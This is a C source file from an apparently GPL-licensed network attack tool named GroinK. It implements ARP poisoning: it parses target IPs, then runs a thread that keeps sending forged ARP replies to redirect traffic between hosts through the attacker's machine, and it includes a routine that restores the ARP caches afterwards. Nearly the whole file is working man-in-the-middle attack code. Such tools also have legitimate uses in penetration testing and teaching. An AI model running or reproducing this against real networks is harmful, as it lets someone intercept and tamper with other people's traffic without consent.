/*
 * Copyright (c) Denatured Ethyl Crew
 *
 * This file is part of GroinK.
 *
 * GroinK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * GroinK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with GroinK.  If not, see <http://www.gnu.org/licenses/>.
 */
#include <string.h>
#include <unistd.h>

#include "debug.h"
#include "globals.h"
#include "host.h"
#include "inject.h"
#include "mitm.h"
#include "netutil.h"
#include "threads.h"
#include "utlist.h"

#define ARP_REPOISONING 1 /* seconds */

/* Thread name */
#define ARP_THREAD_NAME "arp_poisoner"

/* Targets list */
static host_t *t1 = NULL;
static host_t *t2 = NULL;

/* static int target_contains(host_t *target, host_t *h) */
/* { */
/*   host_t *curr = NULL; */
  
/*   LL_FOREACH (target, curr) */
/*     if (strncmp(h->net_addr, curr->net_addr, strlen(h->net_addr)) == 0 && */
/* 	strncmp(h->hw_addr, curr->hw_addr, strlen(h->hw_addr)) == 0) */
/*       return 1; */
/*   return 0; */
/* } */

static void parse_options()
{
  /* OPTIONS: target1:target2 */

  host_t *h = NULL, *curr = NULL, *new = NULL;
  char *opt_bak = NULL;
  char *tok = NULL;
  char *saveptr = NULL;

  opt_bak = strdup(gbls->mitm_options);

  /* Target 1 */

  tok = strtok_r(opt_bak, ":", &saveptr);
  if (tok == NULL) {
    free(opt_bak);
    fatal(__func__, "you must specify at least TARGET1");
  }

  if (is_ip_addr(tok)) {
    h = find_host_byip(tok);

    if (h == NULL) /* FIXME: mem leak */
      fatal(__func__, "unable to find host with ip %s in the host list", tok);

    new = host_clone(h);
    LL_APPEND(t1, new);
    debug("target1: %s, %s", h->net_addr, h->hw_addr);
  } else { /* FIXME: mem leak */
    fatal(__func__, "invalid ARP Poisoning target %s", tok);
  }

  if (t1 == NULL) {
    free(opt_bak);
    fatal(__func__, "TARGET1 list cannot be empty");
  }

  /* Target 2 */

  tok = strtok_r(NULL, ":", &saveptr);
  
  if (tok != NULL) {
    if (is_ip_addr(tok)) {
      h = find_host_byip(tok);
      
      if (h == NULL) /* FIXME: mem leak */
  	fatal(__func__, "unable to find host with ip %s in the host list", tok);
      
      new = host_clone(h);
      LL_APPEND(t2, new);
      debug("target2: %s, %s", h->net_addr, h->hw_addr);
    } else { /* FIXME: mem leak */
      fatal("invalid ARP Poisoning MiTM target %s", tok);
    }
  } else {
    /* Insert all scanned hosts into the t2 */
    LL_FOREACH (gbls->hosts, curr) {
      /* if (target_contains(t2, curr)) */
      /* 	continue; */
      new = host_clone(curr);
      LL_APPEND(t2, new);
      debug("target2: %s, %s", curr->net_addr, curr->hw_addr);
    }
  }
  
  free(opt_bak);
}

static void *arp_poisoning_thread_cb(void *data)
{
  host_t *h1 = NULL, *h2 = NULL;

  THREAD_DEFAULT_INIT;
  
  debug("starting ARP Poisoning...");

  while (1) {
      THREAD_CANCELLATION_POINT;
      
      LL_FOREACH (t1, h1) {
	  LL_FOREACH (t2, h2) {
	    
	    if (strncmp(h1->hw_addr, h2->hw_addr, strlen(h1->hw_addr)) == 0 && 
		strncmp(h1->net_addr, h2->net_addr, strlen(h1->net_addr)) == 0)
	      continue;
	    
	    /* TODO: send icmp packet... */
	    
	    /* Send ARP Reply */
	    inject_arp_reply(gbls->link_addr, h1->net_addr, h2->hw_addr, h2->net_addr);
	    inject_arp_reply(gbls->link_addr, h2->net_addr, h1->hw_addr, h1->net_addr);
	    }
	  usleep(ARP_STORM_WAIT * 1000);
	}
      sleep(ARP_REPOISONING);
    }

  return NULL;
}

void mitm_start_arp_poisoning()
{
  if (gbls->dlt != DLT_EN10MB)
    fatal(__func__, "arp poisoning works only on ethernet networks");

  if (gbls->scan == 0)
    fatal(__func__, "ARP poisoning cannot start with option --no-scan");

  debug("starting arp poisoning...");

  parse_options();
  thread_new(ARP_THREAD_NAME, &arp_poisoning_thread_cb, NULL);
  
  message("ARP poisoning started");
}

static void free_target(host_t *t)
{
  host_t *curr = NULL, *tmp = NULL;
  
  LL_FOREACH_SAFE (t, curr, tmp) {
    LL_DELETE(gbls->hosts, curr);

    free(curr->net_addr);
    free(curr->hw_addr);
    free(curr);
    curr = NULL;
  }
}

void mitm_stop_arp_poisoning()
{
  pthread_t thread = 0;
  int i = 0;
  host_t *h1 = NULL, *h2 = NULL;

  thread = thread_id_from_name(ARP_THREAD_NAME);

  if(thread != 0)
    thread_stop(thread);

  message("ARP poisoning stopped");
  message("restoring the ARP cache of the targets...");

  /* Restore the ARP cache of the targets for 5 times */
  for(i=0; i<5; i++) {
    LL_FOREACH (t1, h1) {
      LL_FOREACH (t2, h2) {
  	/* Send ARP Reply */
  	inject_arp_reply(h1->hw_addr, h1->net_addr, h2->hw_addr, h2->net_addr);
  	inject_arp_reply(h2->hw_addr, h2->net_addr, h1->hw_addr, h1->net_addr);
	
  	usleep(ARP_STORM_WAIT * 1000);
      }
    }
    sleep(ARP_REPOISONING);
  }

  free_target(t1);
  t1 = NULL;
  free_target(t2);
  t2 = NULL;
}
